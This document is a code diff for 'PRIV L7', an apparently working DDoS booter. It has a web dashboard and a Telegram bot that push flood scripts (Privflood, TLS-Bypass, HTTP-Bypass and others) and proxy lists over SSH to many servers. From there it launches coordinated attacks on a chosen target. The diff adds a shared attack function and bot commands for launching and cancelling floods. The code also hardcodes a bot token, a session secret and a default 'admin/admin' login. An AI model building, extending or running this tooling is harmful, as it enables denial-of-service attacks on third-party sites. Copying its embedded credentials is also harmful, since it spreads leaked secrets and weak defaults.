@@ -2,7 +2,7 @@
 'use strict';
 
 /**
- * PRIV L7 HUB — Ultimate Dashboard (No Charts, Pure Action)
+ * PRIV L7 — Unified Hub & Bot (Admin Panel + Mini App)
  */
 
 const fs = require('node:fs');
@@ -17,19 +17,16 @@ const TelegramBot = require('node-telegram-bot-api');
 const { Client } = require('ssh2');
 
 /* ---------- CONFIG ---------- */
-const SELF_PATH = fs.realpathSync(__filename);
-const SCRIPT_DIR = path.dirname(SELF_PATH);
-
+const SCRIPT_DIR = __dirname;
 const CONFIG = {
   BOT_TOKEN: process.env.BOT_TOKEN || '9165016422:AAFw5t2VKPmay2grvN4evutzyAAzkH-E75M',
-  ADMIN_ID: process.env.ADMIN_ID || '7623976106',
+  ADMIN_ID: process.env.ADMIN_ID || '7623976106', // فقط این آیدی به ربات دسترسی داره
   PORT: Number(process.env.PORT || 8443),
   SESSION_SECRET: 'priv-l7-super-secret-6767',
   DATA_DIR: path.join(SCRIPT_DIR, 'privflood-data'),
   PROXY_FILE: 'proxy.txt',
   REMOTE_DIR: '/root/attack',
   SSH_TIMEOUT: 20000,
-  ATTACK_TIMEOUT: 25000,
 };
 
 if (!fs.existsSync(CONFIG.DATA_DIR)) fs.mkdirSync(CONFIG.DATA_DIR, { recursive: true, mode: 0o700 });
@@ -37,26 +34,27 @@ if (!fs.existsSync(CONFIG.DATA_DIR)) fs.mkdirSync(CONFIG.DATA_DIR, { recursive: 
 const USERS_FILE = path.join(CONFIG.DATA_DIR, 'users.json');
 const SERVERS_FILE = path.join(CONFIG.DATA_DIR, 'servers.json');
 
-if (!fs.existsSync(USERS_FILE)) fs.writeFileSync(USERS_FILE, '{}');
 if (!fs.existsSync(SERVERS_FILE)) fs.writeFileSync(SERVERS_FILE, '[]');
 
-/* ---------- STORAGE ---------- */
+/* ---------- STORAGE (Force Admin Reset) ---------- */
 const readJSON = (f, fb) => { try { return JSON.parse(fs.readFileSync(f, 'utf8')); } catch { return fb; } };
 const writeJSON = (f, d) => { const tmp = f + '.tmp'; fs.writeFileSync(tmp, JSON.stringify(d, null, 2), { mode: 0o600 }); fs.renameSync(tmp, f); };
+
+// اطمینان از وجود ادمین با پسورد پیش‌فرض admin
+let users = readJSON(USERS_FILE, {});
+if (!users['admin'] || !users['admin'].passwordHash) {
+  users['admin'] = { passwordHash: bcrypt.hashSync('admin', 10), role: 'admin', limits: { maxDuration: 999, maxRate: 999, maxConcurrent: 99 } };
+  writeJSON(USERS_FILE, users);
+}
+
 const loadUsers = () => readJSON(USERS_FILE, {});
 const saveUsers = (u) => writeJSON(USERS_FILE, u);
 const loadServers = () => readJSON(SERVERS_FILE, []);
 const saveServers = (s) => writeJSON(SERVERS_FILE, s);
 
-// Bootstrap Admin
-const users = loadUsers();
-if (!users['admin']) {
-  users['admin'] = { passwordHash: bcrypt.hashSync('admin', 10), role: 'admin', limits: { maxDuration: 999, maxRate: 999, maxConcurrent: 99 } };
-  saveUsers(users);
-}
-
-/* ---------- SSH ENGINE ---------- */
+/* ---------- SSH & ATTACK ENGINE ---------- */
 const serverConns = new Map();
+const activeSessions = new Map();
 
 function sshConnect(server) {
   return new Promise((resolve, reject) => {
@@ -68,7 +66,6 @@ function sshConnect(server) {
       conn.connect({
         host: server.host, port: server.port, username: server.username, password: server.password,
         readyTimeout: CONFIG.SSH_TIMEOUT,
-        algorithms: { serverHostKey: ['ssh-rsa', 'ecdsa-sha2-nistp256', 'ssh-ed25519'] },
       });
     } catch (e) { clearTimeout(t); reject(e); }
   });
@@ -118,8 +115,7 @@ async function ensureRemoteFiles(conn, methodFile) {
         conn.sftp((err, sftp) => {
           if (err) return rej(err);
           sftp.fastPut(localMethod, `${CONFIG.REMOTE_DIR}/${methodFile}`, (e) => {
-            sftp.end();
-            if (e) rej(e); else res();
+            sftp.end(); if (e) rej(e); else res();
           });
         });
       });
@@ -130,31 +126,24 @@ async function ensureRemoteFiles(conn, methodFile) {
         conn.sftp((err, sftp) => {
           if (err) return rej(err);
           sftp.fastPut(localProxy, `${CONFIG.REMOTE_DIR}/${CONFIG.PROXY_FILE}`, (e) => {
-            sftp.end();
-            if (e) rej(e); else res();
+            sftp.end(); if (e) rej(e); else res();
           });
         });
       });
     }
-  } catch (e) {
-    throw new Error('Sync failed: ' + e.message);
-  }
+  } catch (e) { throw new Error('Sync failed: ' + e.message); }
 }
 
-/* ---------- ATTACK ENGINE ---------- */
-const activeSessions = new Map();
-
 const BUILTIN_METHODS = [
-  { id: 'priv', name: 'Privflood', file: 'priv.js', layer: 'L7', parse: (a) => [a[0], a[1], CONFIG.PROXY_FILE, a[2], a[3]] },
-  { id: 'crush', name: 'C-Rush', file: 'l.js', layer: 'L7', parse: (a) => [a[0], a[1], CONFIG.PROXY_FILE, a[2], a[3], '-c', '-h'] },
-  { id: 'tls', name: 'TLS-Bypass', file: 'tls.js', layer: 'L7', parse: (a) => [a[0], a[1], a[3], a[2], CONFIG.PROXY_FILE] },
-  { id: 'bypass', name: 'HTTP-Bypass', file: 'bypass.js', layer: 'L7', parse: (a) => ['GET', a[0], a[1], a[2], a[3], CONFIG.PROXY_FILE] },
+  { id: 'priv', name: 'Privflood', file: 'priv.js', parse: (a) => [a[0], a[1], CONFIG.PROXY_FILE, a[2], a[3]] },
+  { id: 'crush', name: 'C-Rush', file: 'l.js', parse: (a) => [a[0], a[1], CONFIG.PROXY_FILE, a[2], a[3], '-c', '-h'] },
+  { id: 'tls', name: 'TLS-Bypass', file: 'tls.js', parse: (a) => [a[0], a[1], a[3], a[2], CONFIG.PROXY_FILE] },
+  { id: 'bypass', name: 'HTTP-Bypass', file: 'bypass.js', parse: (a) => ['GET', a[0], a[1], a[2], a[3], CONFIG.PROXY_FILE] },
 ];
 
 function launchLocal(sessionId, methodFile, args) {
   const mp = path.join(SCRIPT_DIR, methodFile);
   if (!fs.existsSync(mp)) throw new Error(`Local file missing: ${methodFile}`);
-  
   const child = spawn(process.execPath, [mp, ...args], { cwd: SCRIPT_DIR, detached: true, stdio: 'ignore', env: { PATH: process.env.PATH || '' } });
   activeSessions.set(sessionId + '_local', { type: 'local', pid: child.pid, timer: null });
   return child.pid;
@@ -164,7 +153,6 @@ async function launchRemote(sessionId, methodFile, args, serverId) {
   const server = loadServers().find(s => s.id === serverId);
   if (!server) throw new Error('Server not found');
   const conn = await getConn(serverId);
-  
   await ensureRemoteFiles(conn, methodFile);
 
   const logFile = `/tmp/.atk_${sessionId}_${serverId}.log`;
@@ -172,12 +160,10 @@ async function launchRemote(sessionId, methodFile, args, serverId) {
   const r = await sshExec(conn, cmd, 15000);
   
   let pid = parseInt((r.out||'').trim().replace(/[^0-9]/g,''), 10);
-  
   if (!pid) {
     const pg = await sshExec(conn, `pgrep -f "node ${methodFile}" | head -1`, 5000);
     pid = parseInt((pg.out||'').trim().replace(/[^0-9]/g,''), 10);
   }
-
   if (!pid) {
     const log = await sshExec(conn, `tail -5 ${logFile} 2>/dev/null || echo "No log"`, 5000);
     throw new Error(`${server.name}: ${(log.out||'').trim().slice(0,60)}`);
@@ -201,6 +187,30 @@ async function stopAttackSession(sessionId) {
       activeSessions.delete(key);
     }
   }
+}
+
+async function runAttack(methodId, target, duration, threads, rate) {
+  const method = BUILTIN_METHODS.find(m => m.id === methodId);
+  if (!method) throw new Error('Method not found');
+
+  const args = method.parse([target, String(duration), String(threads), String(rate)]);
+  const sessionId = 'sess_' + crypto.randomBytes(4).toString('hex');
+
+  launchLocal(sessionId, method.file, args);
+  const servers = loadServers().filter(s => s.status === 'online');
+  let successCount = 1;
+  
+  const results = await Promise.allSettled(servers.map(s => launchRemote(sessionId, method.file, args, s.id)));
+  results.forEach((r, i) => {
+    if (r.status === 'fulfilled') successCount++;
+    else console.error(`[attack] Server ${servers[i].name} failed: ${r.reason.message}`);
+  });
+
+  const t = setTimeout(() => stopAttackSession(sessionId), duration * 1000);
+  for (const [k, v] of activeSessions.entries()) {
+    if (k.startsWith(sessionId)) v.timer = t;
+  }
+  return { sessionId, launched: successCount, total: servers.length + 1 };
 }
 
 /* ---------- EXPRESS APP ---------- */
@@ -250,7 +260,7 @@ function adminOnly(req, res, next) {
   next();
 }
 
-/* ---------- API ROUTES ---------- */
+/* API ROUTES */
 app.post('/api/login', async (req, res) => {
   const { username, password } = req.body;
   const u = loadUsers()[username];
@@ -270,61 +280,31 @@ app.post('/api/logout', auth, (req, res) => req.session.destroy(() => res.json({
 app.get('/api/stats', auth, (req, res) => {
   const servers = loadServers();
   const online = servers.filter(s => s.status === 'online').length;
-  res.json({
-    servers: { online, total: servers.length },
-    limits: req.user.limits || {},
-  });
+  res.json({ servers: { online, total: servers.length }, limits: req.user.limits || {} });
 });
 
-app.get('/api/methods', auth, (req, res) => {
-  res.json(BUILTIN_METHODS.map(m => ({ id: m.id, name: m.name, layer: m.layer })));
-});
+app.get('/api/methods', auth, (req, res) => res.json(BUILTIN_METHODS.map(m => ({ id: m.id, name: m.name }))));
 
 app.post('/api/attack', auth, async (req, res) => {
   const { methodId, target, duration, threads, rate } = req.body;
-  const method = BUILTIN_METHODS.find(m => m.id === methodId);
-  if (!method) return res.status(400).json({ error: 'Method not found' });
-  
   const limits = req.user.limits || {};
   if (limits.maxDuration && duration > limits.maxDuration) return res.status(400).json({ error: `Max duration ${limits.maxDuration}s` });
   if (limits.maxRate && rate > limits.maxRate) return res.status(400).json({ error: `Max rate ${limits.maxRate}` });
 
-  const args = method.parse([target, String(duration), String(threads), String(rate)]);
-  const sessionId = 'sess_' + crypto.randomBytes(4).toString('hex');
-
   try {
-    launchLocal(sessionId, method.file, args);
-    
-    const servers = loadServers().filter(s => s.status === 'online');
-    let successCount = 1;
-    
-    const results = await Promise.allSettled(servers.map(s => launchRemote(sessionId, method.file, args, s.id)));
-    results.forEach((r, i) => {
-      if (r.status === 'fulfilled') successCount++;
-      else console.error(`[attack] Server ${servers[i].name} failed: ${r.reason.message}`);
-    });
-
-    const t = setTimeout(() => stopAttackSession(sessionId), duration * 1000);
-    for (const [k, v] of activeSessions.entries()) {
-      if (k.startsWith(sessionId)) v.timer = t;
-    }
-    
-    res.json({ ok: true, sessionId, launched: successCount, total: servers.length + 1 });
-  } catch (e) {
-    res.status(500).json({ error: e.message });
-  }
+    const result = await runAttack(methodId, target, duration, threads, rate);
+    res.json({ ok: true, ...result });
+  } catch (e) { res.status(500).json({ error: e.message }); }
 });
 
 app.post('/api/cancel', auth, async (req, res) => {
   const { sessionId } = req.body;
-  if (!sessionId) return res.status(400).json({ error: 'Missing sessionId' });
   await stopAttackSession(sessionId);
   res.json({ ok: true });
 });
 
 app.get('/api/admin/users', auth, adminOnly, (req, res) => {
-  const list = loadUsers();
-  res.json(Object.keys(list).map(u => ({ username: u, role: list[u].role, limits: list[u].limits })));
+  res.json(Object.keys(loadUsers()).map(u => ({ username: u, role: loadUsers()[u].role, limits: loadUsers()[u].limits })));
 });
 
 app.post('/api/admin/users', auth, adminOnly, async (req, res) => {
@@ -340,8 +320,9 @@ app.post('/api/admin/users', auth, adminOnly, async (req, res) => {
   }
 });
 
-/* ---------- UI ---------- */
-const HTML = `<!doctype html>
+/* UI HTML */
+const HTML = `
+<!doctype html>
 <html lang="en">
 <head>
 <meta charset="utf-8">
@@ -364,9 +345,6 @@ body { background: var(--bg); color: var(--text); padding-bottom: 80px; }
 .box-label { font-size: 11px; color: var(--muted); text-transform: uppercase; margin-bottom: 6px; font-weight: 700; letter-spacing: 0.5px; }
 .box-val { font-size: 22px; font-weight: 700; }
 .panel { background: var(--panel); border: 1px solid var(--border); border-radius: 20px; margin: 0 20px 20px; padding: 20px; }
-.toggle-wrap { display: flex; background: var(--bg); border: 1px solid var(--border); border-radius: 12px; padding: 4px; margin-bottom: 20px; }
-.toggle-btn { flex: 1; padding: 10px; text-align: center; border-radius: 8px; font-size: 14px; font-weight: 700; color: var(--muted); cursor: pointer; transition: 0.2s; }
-.toggle-btn.active { background: var(--text); color: var(--bg); }
 .field { margin-bottom: 15px; }
 .field label { display: block; font-size: 11px; color: var(--muted); text-transform: uppercase; margin-bottom: 8px; font-weight: 700; letter-spacing: 0.5px; }
 .field input, .field select { width: 100%; background: var(--bg); border: 1px solid var(--border); color: var(--text); padding: 14px; border-radius: 12px; font-size: 16px; outline: none; transition: 0.2s; }
@@ -423,10 +401,6 @@ body { background: var(--bg); color: var(--text); padding-bottom: 80px; }
     </div>
 
     <div class="panel">
-      <div class="toggle-wrap">
-        <div class="toggle-btn" onclick="setLayer('L4')" id="btnL4">L4</div>
-        <div class="toggle-btn active" onclick="setLayer('L7')" id="btnL7">L7</div>
-      </div>
       <div class="field"><label>Method</label><select id="attMethod"></select></div>
       <div class="field"><label>Target</label><input type="text" id="attTarget" placeholder="ex: google.com"></div>
       <div class="row">
@@ -464,7 +438,6 @@ body { background: var(--bg); color: var(--text); padding-bottom: 80px; }
 </div>
 
 <script>
-  let currentLayer = 'L7';
   let methods = [];
   let currentSessionId = null;
   const tg = window.Telegram?.WebApp;
@@ -519,16 +492,9 @@ body { background: var(--bg); color: var(--text); padding-bottom: 80px; }
   api('/api/me').then(() => showApp()).catch(() => {});
 
   function renderMethods() {
-    document.getElementById('attMethod').innerHTML = methods.filter(m => m.layer === currentLayer).map(m => '<option value="' + m.id + '">' + m.name + '</option>').join('');
+    document.getElementById('attMethod').innerHTML = methods.map(m => '<option value="' + m.id + '">' + m.name + '</option>').join('');
   }
   
-  function setLayer(l) {
-    currentLayer = l;
-    document.getElementById('btnL4').classList.toggle('active', l === 'L4'); 
-    document.getElementById('btnL7').classList.toggle('active', l === 'L7');
-    renderMethods();
-  }
-
   async function fetchStats() {
     try {
       const d = await api('/api/stats');
@@ -627,8 +593,9 @@ body { background: var(--bg); color: var(--text); padding-bottom: 80px; }
 app.get('/', (req, res) => res.type('html').send(HTML));
 app.use((err, req, res, next) => res.status(500).json({ error: 'Server error' }));
 
-/* ---------- TUNNEL & BOT ---------- */
+/* ---------- TELEGRAM BOT (Admin Only) ---------- */
 let TUNNEL_URL = '';
+
 function startTunnel() {
   const cf = spawn('cloudflared', ['tunnel', '--url', `http://localhost:${CONFIG.PORT}`]);
   cf.stderr.on('data', (data) => {
@@ -642,11 +609,63 @@ function startTunnel() {
 }
 
 const bot = new TelegramBot(CONFIG.BOT_TOKEN, { polling: true });
+
+// دستورات ربات فقط برای ادمین
 bot.onText(/\/start/, (msg) => {
-  if (!TUNNEL_URL) return bot.sendMessage(msg.chat.id, '⏳ Starting tunnel... try again in 5s.');
-  bot.sendMessage(msg.chat.id, `Welcome to PRIV L7!`, {
-    reply_markup: { inline_keyboard: [[{ text: "Open Hub 🚀", web_app: { url: TUNNEL_URL } }]] }
-  });
+  if (msg.from.id.toString() !== CONFIG.ADMIN_ID) {
+    if (!TUNNEL_URL) return bot.sendMessage(msg.chat.id, '⏳ Connecting... try again in 5s.');
+    return bot.sendMessage(msg.chat.id, `Welcome to PRIV L7.\nClick below to open the panel.`, {
+      reply_markup: { inline_keyboard: [[{ text: "Open Hub 🚀", web_app: { url: TUNNEL_URL } }]] }
+    });
+  }
+
+  const adminKeyboard = {
+    reply_markup: {
+      inline_keyboard: [
+        [{ text: "🖥 Open Web Panel", web_app: { url: TUNNEL_URL || "https://t.me" } }],
+        [{ text: "📊 Server Stats", callback_data: "stats" }]
+      ]
+    }
+  };
+  bot.sendMessage(msg.chat.id, `👑 Welcome Admin.\nUse the panel below or type commands:\n\n/attack <method> <target> <time> <threads> <rate>\n/users\n/cancel`, adminKeyboard);
+});
+
+// دستور /attack
+bot.onText(/\/attack (.+)/, async (msg, match) => {
+  if (msg.from.id.toString() !== CONFIG.ADMIN_ID) return;
+  const parts = match[1].split(' ');
+  if (parts.length < 5) return bot.sendMessage(msg.chat.id, '⚠️ Usage: /attack <method> <target> <time> <threads> <rate>');
+  
+  const [method, target, time, threads, rate] = parts;
+  bot.sendMessage(msg.chat.id, `🚀 Launching ${method} on ${target}...`);
+  
+  try {
+    const res = await runAttack(method, target, Number(time), Number(threads), Number(rate));
+    bot.sendMessage(msg.chat.id, `✅ Attack launched on ${res.launched}/${res.total} nodes.`);
+  } catch (e) {
+    bot.sendMessage(msg.chat.id, `❌ Error: ${e.message}`);
+  }
+});
+
+// دستور /users
+bot.onText(/\/users/, (msg) => {
+  if (msg.from.id.toString() !== CONFIG.ADMIN_ID) return;
+  const list = loadUsers();
+  let text = '👥 **Registered Users:**\n\n';
+  for (const [u, data] of Object.entries(list)) {
+    text += `👤 \`${u}\` | Role: ${data.role}\n`;
+  }
+  bot.sendMessage(msg.chat.id, text, { parse_mode: 'Markdown' });
+});
+
+// دستور /cancel
+bot.onText(/\/cancel/, (msg) => {
+  if (msg.from.id.toString() !== CONFIG.ADMIN_ID) return;
+  for (const key of activeSessions.keys()) {
+    const sessionId = key.split('_')[0] + '_' + key.split('_')[1];
+    stopAttackSession(sessionId);
+  }
+  bot.sendMessage(msg.chat.id, '🛑 All active attacks cancelled.');
 });
 
 app.listen(CONFIG.PORT, () => {
